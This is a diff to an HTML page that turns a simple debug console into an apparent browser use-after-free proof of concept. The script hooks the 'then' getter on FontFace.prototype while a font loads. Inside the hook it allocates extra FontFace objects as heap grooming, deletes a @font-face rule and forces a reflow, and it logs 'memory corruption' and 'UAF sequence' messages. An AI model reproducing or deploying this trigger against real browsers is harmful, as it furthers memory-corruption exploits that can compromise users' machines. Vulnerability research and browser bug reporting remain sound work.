@@ -1,53 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 10px; }
-        #console { width: 100%; height: 90vh; overflow-y: scroll; border: 1px solid #333; }
+    <style id="s">
+        @font-face { font-family: 'x'; src: url('nonexistent-font.woff'); unicode-range: U+0042; }
     </style>
 </head>
 <body>
-    <div id="console"></div>
-    <style id="s">@font-face { font-family: 'x'; src: local('Arial'); }</style>
+    <div id="console" style="background:#000; color:#0f0; font-family:monospace; height:90vh; overflow:auto;"></div>
 
     <script>
         const logBox = document.getElementById('console');
-        
-        // كونسول مباشر يعرض أي شيء يمر عبره
         function debug(msg) {
             logBox.innerHTML += `<div>[${performance.now().toFixed(2)}ms] ${msg}</div>`;
             logBox.scrollTop = logBox.scrollHeight;
         }
 
-        // مراقبة شاملة: اعتراض أي وصول للـ then في أي كائن
-        Object.defineProperty(Object.prototype, 'then', {
-            configurable: true,
-            get() {
-                debug("INTERCEPTED: Access to 'then' detected!");
-                return undefined;
-            }
-        });
+        window.onload = () => {
+            debug("System Initialized. Starting PoC...");
 
-        window.onload = async () => {
-            debug("System Initialized. Universal Hook active.");
-            
-            try {
-                let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-                debug("FontFace created.");
-                
-                document.fonts.add(A);
-                debug("FontFace added to document.fonts.");
+            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+            document.fonts.add(A);
+            void A.loaded;
 
-                debug("Starting Font load...");
-                // استدعاء التحميل
-                let p = document.fonts.load('1em x', 'AB');
-                debug("Load() function called.");
-                
-                await p;
-                debug("Load promise resolved.");
-            } catch (e) {
-                debug("CRITICAL ERROR: " + e.message);
-            }
+            let fired = false;
+            Object.defineProperty(FontFace.prototype, 'then', {
+                configurable: true,
+                get() {
+                    if (!fired && this === A) {
+                        fired = true;
+                        debug("!!! TRAP HIT: Memory corruption initiated !!!");
+                        
+                        // محاولة تضخيم الذاكرة لإزاحة الكائنات (Heap Manipulation)
+                        new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                        new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                        
+                        debug("Executing Rule Deletion...");
+                        document.getElementById('s').sheet.deleteRule(0);
+                        
+                        debug("Triggering Reflow...");
+                        document.body.offsetTop;
+                        
+                        debug("UAF Sequence completed.");
+                    }
+                    return undefined;
+                }
+            });
+
+            debug("Loading font 'x'...");
+            document.fonts.load('1em x', 'AB').then(() => {
+                debug("Load Success.");
+            }).catch((e) => {
+                debug("Load Rejected: " + e.message);
+            });
         };
     </script>
 </body>
